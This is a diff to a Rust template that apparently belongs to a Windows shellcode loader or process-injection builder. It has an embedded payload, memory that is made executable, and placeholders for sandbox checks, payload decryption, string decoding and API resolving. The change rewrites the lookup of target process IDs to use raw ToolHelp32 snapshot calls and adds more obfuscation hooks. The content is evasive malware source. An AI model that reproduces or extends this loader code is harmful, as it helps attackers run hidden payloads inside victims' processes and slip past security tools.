@@ -1,22 +1,29 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case, non_camel_case_types)]
 
-use sysinfo::System;
 use std::include_bytes;
 use std::ptr::null_mut;
+use std::time::Instant;
 use core::ffi::c_void;
 
+use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
 use windows_sys::Win32::System::Memory::{
     MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
 };
-
-use std::time::Instant;
+use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+};
 
 {{IMPORTS}}
 
 {{SANDBOX_IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
+
+{{STR_DECODER}}
+
+{{API_RESOLVER}}
 
 type HANDLE = *mut c_void;
 
@@ -48,13 +55,33 @@ fn nt_success(s: i32) -> bool { s >= 0 }
 
 fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
     let tar_lower = tar.to_lowercase();
-    for (_, pro) in s.processes() {
-        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+
+    unsafe {
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot == INVALID_HANDLE_VALUE {
+            return dom;
         }
+
+        let mut entry: PROCESSENTRY32W = core::mem::zeroed();
+        entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+        if Process32FirstW(snapshot, &mut entry) != 0 {
+            loop {
+                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
+                let name = String::from_utf16_lossy(&entry.szExeFile[..len]);
+                if name.to_lowercase() == tar_lower {
+                    dom.push(entry.th32ProcessID as usize);
+                }
+                if Process32NextW(snapshot, &mut entry) == 0 {
+                    break;
+                }
+            }
+        }
+
+        CloseHandle(snapshot);
     }
+
     dom
 }
 
